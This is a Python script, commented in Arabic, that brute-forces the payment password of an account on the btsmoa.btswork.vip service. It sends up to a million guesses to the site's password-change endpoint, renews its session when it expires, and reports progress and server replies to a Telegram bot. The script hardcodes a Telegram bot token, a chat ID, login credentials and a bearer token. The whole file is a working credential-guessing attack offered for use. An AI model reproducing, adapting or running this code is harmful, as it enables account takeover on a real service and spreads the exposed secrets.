import requests
import json
import threading
from concurrent.futures import ThreadPoolExecutor

# بيانات تيليجرام
telegram_bot_token = "6724140823:AAE1pkFDNCAaKa1ahmXan8EJGyCNoTFTpg0"
telegram_chat_id = "1701465279"

# بيانات تسجيل الدخول
login_data = {
    'username': '1281811280',
    'password': '123456',
    'lang': 'eg',
}

# التوكن المستخدم في الطلبات
token = "02c8znoKfqx8sfRg0C0p1mQ64VVuoa7vMu+wgn1rttGH04eVulqXpX0SM9mF"

# معرّف الرسالة الحية
live_message_id = None
progress_lock = threading.Lock()  # قفل لحماية التحديثات بين الخيوط

# رأس الطلبات (Headers)
headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'PythonRequests',
    'Authorization': f'Bearer {token}',  # استخدام التوكن في الترويسة
}

# دالة إعادة تسجيل الدخول
def relogin():
    global token  
    print("🔄 إعادة تسجيل الدخول للحصول على توكن جديد...")
    
    try:
        response = requests.post('https://btsmoa.btswork.vip/api/User/Login', headers=headers, json=login_data)
        if response.status_code == 200:
            result = response.json()
            if "info" in result and "token" in result["info"]:
                token = result["info"]["token"]  # تحديث التوكن الجديد
                print(f"✅ تم الحصول على التوكن الجديد: {token}")
                return True
        print(f"❌ فشل الحصول على التوكن! الرد: {result}")
    except requests.exceptions.RequestException as e:
        print(f"⚠️ خطأ أثناء تسجيل الدخول: {e}")
    return False

# دالة إرسال أو تحديث الرسالة الحية في تيليجرام
def send_or_update_telegram_message(current, total, last_response):
    global live_message_id

    # تحويل الرد إلى نص دون تغيير تنسيقه
    formatted_response = json.dumps(last_response, indent=2, ensure_ascii=False)

    message = f"""
<b>𝗕𝗟𝗔𝗖𝗞 𓃠 | حالة التخمين 🔥</b>

📊 <b>التقدم:</b> {current}/{total} كلمة مرور تمت تجربتها
📩 <b>آخر رد من السيرفر:</b>
<pre>{formatted_response}</pre>
"""

    # أزرار التحكم
    buttons = {
        "inline_keyboard": [
            [{"text": "⏹️ إيقاف التخمين", "callback_data": "stop"}],
            [{"text": "🔄 إعادة التشغيل", "callback_data": "restart"}],
            [{"text": "📊 حالة البوت", "callback_data": "status"}]
        ]
    }

    url_send = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    url_edit = f"https://api.telegram.org/bot{telegram_bot_token}/editMessageText"

    with progress_lock:
        if live_message_id is None:
            # إرسال رسالة جديدة لأول مرة
            data = {
                "chat_id": telegram_chat_id,
                "text": message,
                "parse_mode": "HTML",
                "reply_markup": json.dumps(buttons)
            }
            try:
                response = requests.post(url_send, json=data)
                response_json = response.json()
                if response_json.get("ok"):
                    live_message_id = response_json["result"]["message_id"]
            except requests.exceptions.RequestException as e:
                print(f"⚠️ خطأ أثناء إرسال رسالة تيليجرام: {e}")
        else:
            # تحديث الرسالة الحالية
            data = {
                "chat_id": telegram_chat_id,
                "message_id": live_message_id,
                "text": message,
                "parse_mode": "HTML",
                "reply_markup": json.dumps(buttons)
            }
            try:
                requests.post(url_edit, json=data)
            except requests.exceptions.RequestException as e:
                print(f"⚠️ خطأ أثناء تحديث رسالة تيليجرام: {e}")

# دالة تجربة كلمة المرور
def try_password(password_index, total_passwords):
    global token

    o_payword = f"password-{password_index}"  # استخدم الكود الفعلي لتجربة كلمة المرور هنا

    # إعداد البيانات لإرسالها إلى السيرفر
    data = {
        'o_payword': o_payword,
        'n_payword': '123123',  # كلمة المرور الجديدة (أو المستخدمة في التغيير)
        'r_payword': '123123',  # كلمة المرور الجديدة (أو المستخدمة في التغيير)
        'lang': 'eg',
        'token': token,  # التوكن الذي سيتم استخدامه في كل عملية
    }

    # استبدل هذا الرابط بعنوان API الفعلي
    url = "https://btsmoa.btswork.vip/api/user/setuserinfo"
    try:
        response = requests.post(url, json=data, headers=headers)
        response_json = response.json()

        print(f"🔹 تجربة كلمة المرور: {o_payword}")  # طباعة عالشاشة
        print(f"🔹 رد السيرفر: {json.dumps(response_json, indent=2, ensure_ascii=False)}")  # طباعة رد السيرفر في الكونسول

        # التحقق من الرد في حالة انتهاء الجلسة
        if response_json.get("code") in [203, 204]:
            print("⚠️ الجلسة انتهت، سيتم تسجيل الدخول مرة أخرى...")
            if relogin():
                print("🔄 إعادة المحاولة باستخدام نفس كلمة المرور...")
                try_password(password_index, total_passwords)  # إعادة التجربة بعد تسجيل الدخول
            return

        # تحديث الرسالة الحية في تيليجرام
        send_or_update_telegram_message(password_index, total_passwords, response_json)

    except requests.exceptions.RequestException as e:
        print(f"⚠️ حدث خطأ أثناء إرسال الطلب: {e}")

# تشغيل تجربة كلمات المرور
def start_password_testing():
    total_passwords = 1000000  # عدّل هذا حسب عدد كلمات المرور

    for i in range(1, total_passwords + 1):
        try_password(i, total_passwords)

# تشغيل التجربة
start_password_testing()